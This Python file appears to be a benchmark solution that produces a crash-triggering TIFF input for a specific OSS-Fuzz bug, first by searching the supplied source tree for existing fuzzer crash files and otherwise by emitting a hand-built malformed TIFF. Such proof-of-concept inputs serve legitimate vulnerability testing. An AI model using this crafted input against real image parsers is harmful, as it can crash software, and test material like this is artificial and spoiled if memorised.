import os
import tarfile
import tempfile
import shutil
import zipfile
import gzip


class Solution:
    def solve(self, src_path: str) -> bytes:
        TARGET_SIZE = 162

        if os.path.isdir(src_path):
            root_dir = src_path
            cleanup_dir = None
        else:
            # Assume tarball; extract to temp dir
            tmpdir = tempfile.mkdtemp(prefix="src-extract-")
            cleanup_dir = tmpdir
            try:
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        tf.extractall(tmpdir)
                    root_dir = tmpdir
                except tarfile.TarError:
                    # Not a tarball; treat the path itself as directory (likely empty)
                    root_dir = tmpdir
            except Exception:
                root_dir = tmpdir

        try:
            poc = self._find_poc_file(root_dir, TARGET_SIZE)
        finally:
            if cleanup_dir is not None:
                shutil.rmtree(cleanup_dir, ignore_errors=True)

        if poc is not None:
            return poc

        return self._build_fallback_tiff()

    def _is_tiff_header(self, header: bytes) -> bool:
        if len(header) < 4:
            return False
        return (
            (header[0:2] == b"II" and header[2:4] == b"*\x00")
            or (header[0:2] == b"MM" and header[2:4] == b"\x00*")
        )

    def _find_poc_file(self, root_dir: str, target_size: int) -> bytes | None:
        TARGET_BUG_ID = "388571282"
        KEYWORDS = [
            "poc",
            "crash",
            "testcase",
            "clusterfuzz",
            "oss-fuzz",
            "bug",
            "issue",
            "repro",
            "input",
            "seed",
            "case",
        ]
        TIF_EXTS = {".tif", ".tiff"}
        ZIP_EXTS = {".zip", ".gz"}

        candidates = []

        def add_candidate(score: int, size: int, data: bytes | None, path: str | None):
            size_diff = abs(size - target_size)
            candidates.append(
                {
                    "score": score,
                    "size_diff": size_diff,
                    "size": size,
                    "path": path,
                    "data": data,
                }
            )

        for dirpath, dirnames, filenames in os.walk(root_dir, followlinks=False):
            for filename in filenames:
                path = os.path.join(dirpath, filename)
                path_lower = path.lower()
                ext = os.path.splitext(filename)[1].lower()

                # Handle compressed archives likely containing PoCs
                if ext in ZIP_EXTS and (
                    TARGET_BUG_ID in path_lower
                    or "clusterfuzz" in path_lower
                    or "oss-fuzz" in path_lower
                    or "poc" in path_lower
                    or "crash" in path_lower
                    or "testcase" in path_lower
                ):
                    if ext == ".zip":
                        try:
                            with zipfile.ZipFile(path, "r") as zf:
                                for info in zf.infolist():
                                    if info.is_dir():
                                        continue
                                    if info.file_size <= 0 or info.file_size > 524288:
                                        continue
                                    try:
                                        data = zf.read(info)
                                    except Exception:
                                        continue
                                    if not self._is_tiff_header(data[:4]):
                                        continue
                                    inner_name_lower = info.filename.lower()
                                    combined = path_lower + "::" + inner_name_lower
                                    score = 0
                                    if TARGET_BUG_ID in combined:
                                        score += 100
                                    if "oss-fuzz" in combined or "clusterfuzz" in combined:
                                        score += 40
                                    for kw in KEYWORDS:
                                        if kw in combined:
                                            score += 10
                                    score += 30  # TIFF header
                                    add_candidate(score, len(data), data, None)
                        except Exception:
                            pass
                    elif ext == ".gz":
                        try:
                            with gzip.open(path, "rb") as f:
                                data = f.read(524288)
                            if self._is_tiff_header(data[:4]):
                                score = 0
                                if TARGET_BUG_ID in path_lower:
                                    score += 100
                                if "oss-fuzz" in path_lower or "clusterfuzz" in path_lower:
                                    score += 40
                                for kw in KEYWORDS:
                                    if kw in path_lower:
                                        score += 10
                                score += 30
                                add_candidate(score, len(data), data, None)
                        except Exception:
                            pass
                    # Do not treat compressed files as raw TIFF
                    continue

                # Regular file handling
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size <= 0:
                    continue

                try:
                    with open(path, "rb") as f:
                        header = f.read(4)
                except OSError:
                    continue

                if not self._is_tiff_header(header):
                    continue

                name_lower = filename.lower()
                score = 0

                if TARGET_BUG_ID in name_lower or TARGET_BUG_ID in path_lower:
                    score += 100

                if "oss-fuzz" in path_lower or "clusterfuzz" in path_lower:
                    score += 40

                if any(part in path_lower for part in ("/tests", "/test", "/corpus", "/seeds")):
                    score += 10

                ext = os.path.splitext(filename)[1].lower()
                if ext in TIF_EXTS:
                    score += 5

                for kw in KEYWORDS:
                    if kw in name_lower or kw in path_lower:
                        score += 10

                score += 30  # TIFF header bonus

                add_candidate(score, size, None, path)

        if not candidates:
            return None

        candidates.sort(
            key=lambda c: (-c["score"], c["size_diff"], c["size"])
        )
        best = candidates[0]

        if best["data"] is not None:
            return best["data"]

        path = best["path"]
        if path is None:
            return None
        try:
            with open(path, "rb") as f:
                return f.read()
        except OSError:
            return None

    def _build_fallback_tiff(self) -> bytes:
        # Minimal little-endian TIFF with two IFD entries,
        # second being an "offline" tag with value offset 0.
        return bytes(
            [
                # Header: 'II' + 42 + offset to first IFD (8)
                0x49,
                0x49,
                0x2A,
                0x00,
                0x08,
                0x00,
                0x00,
                0x00,
                # IFD: 2 entries
                0x02,
                0x00,
                # Entry 1: Tag 0x0100 (ImageWidth), type SHORT (3), count=1, value=1
                0x00,
                0x01,
                0x03,
                0x00,
                0x01,
                0x00,
                0x00,
                0x00,
                0x01,
                0x00,
                0x00,
                0x00,
                # Entry 2: Tag 0x010E (ImageDescription), type ASCII (2), count=8, value offset = 0
                0x0E,
                0x01,
                0x02,
                0x00,
                0x08,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                0x00,
                # Next IFD offset = 0
                0x00,
                0x00,
                0x00,
                0x00,
            ]
        )
